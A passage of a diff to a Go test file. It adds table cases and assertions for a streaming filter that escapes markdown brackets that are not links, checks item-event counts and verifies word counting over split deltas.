+		{"a bracket no target follows", "The order is [not a link] here.", escaped("The order is [not a link] here."), 0},
+		{"a newline inside the span", "The order is [not\na link either.", escaped("The order is [not\na link either."), 0},
+		{"a newline inside the target", "The order is [a](/issues/\nINFRA-1279) here.", escaped("The order is [a](/issues/\nINFRA-1279) here."), 0},
+		{"a link inside an unclosed bracket", "The order is [one [two](/issues/INFRA-1279) here.", escaped("The order is [one two here."), 1},
+		{"a span still held at the end", "The order is [unterminated", escaped("The order is [unterminated"), 0},
+		{"a target still held at the end", "The order is [a](/issues/INFRA-1279", escaped("The order is [a](/issues/INFRA-1279"), 0},
 	} {
 		t.Run(tc.name, func(t *testing.T) {
 			emitted := drive(t, citationsOf(citedIssue), pieces(tc.answer, 4)...)
-			if got := emitted.text(); got != tc.want {
+			got := emitted.text()
+			if got != tc.want {
 				t.Errorf("answer = %q, want %q", got, tc.want)
+			}
+			plainText(t, got)
+			if items := emitted.count(contracts.GoingEventItem); items != tc.items {
+				t.Errorf("stream holds %d item events, want %d: %v", items, tc.items, emitted.names())
 			}
 			if got := emitted.count(contracts.GoingEventChanged); got != 0 {
 				t.Errorf("stream holds %d changed events, want none for a span that was no link", got)
@@ -709,7 +942,8 @@ func TestFilterHandsTheWritersFailureToItsCaller(t *testing.T) {
 }
 
 // TestFilterCountsTheWordsStringsFieldsCounts: the count the cut and the end carry is
-// strings.Fields over everything the reader saw, however the deltas split its words.
+// strings.Fields over everything the reader saw, however the deltas split its words. An escape
+// adds no space, so the words the server counts are the words the reader reads.
 func TestFilterCountsTheWordsStringsFieldsCounts(t *testing.T) {
 	for _, size := range []int{1, 3, 7, 1000} {
 		answer := "Dispatch keeps the broadcast order on [Answer a question](/issues/INFRA-1279) itself, not on the comment."
